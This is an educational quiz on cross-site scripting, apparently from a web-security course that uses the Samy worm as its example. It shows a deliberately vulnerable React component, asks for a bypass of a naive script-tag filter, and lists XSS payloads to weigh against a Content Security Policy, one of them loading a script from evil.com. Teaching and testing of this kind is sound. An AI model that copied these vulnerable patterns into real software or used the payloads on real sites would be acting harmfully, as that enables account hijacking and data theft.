# Lesson 4 Quiz: The Samy Worm and XSS

Answer these without looking back at the lesson. Write out your reasoning.

---

## Question 1: Spot the XSS

Here's a React component. Is it vulnerable to XSS? If so, explain how an attacker could
exploit it.

```jsx
function UserProfile({ user }) {
  return (
    <div>
      <h1>{user.displayName}</h1>
      <p>Website: <a href={user.websiteUrl}>{user.websiteUrl}</a></p>
      <div className="bio" dangerouslySetInnerHTML={{ __html: user.bio }} />
    </div>
  );
}
```

---

## Question 2: Bypass the Filter

A developer wrote this sanitization function for their comment system:

```js
function sanitize(input) {
  return input.replace(/<script>/gi, '').replace(/<\/script>/gi, '');
}

commentDiv.innerHTML = sanitize(userComment);
```

Craft an input string that executes `alert('XSS')` despite this filter.

---

## Question 3: Stored vs. Reflected

Explain the difference between stored XSS and reflected XSS. For each type, give a
realistic example of where it might appear in a modern web application. Which one is
generally considered more dangerous, and why?

---

## Question 4: How CSP Helps

A developer adds this Content Security Policy header to their application:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

For each of the following XSS payloads, explain whether CSP would block it or not, and why:

1. `<script>alert('XSS')</script>`
2. `<img src=x onerror="alert('XSS')">`
3. `<script src="https://evil.com/steal.js"></script>`
4. `<div style="background: url('javascript:alert(1)')">test</div>`
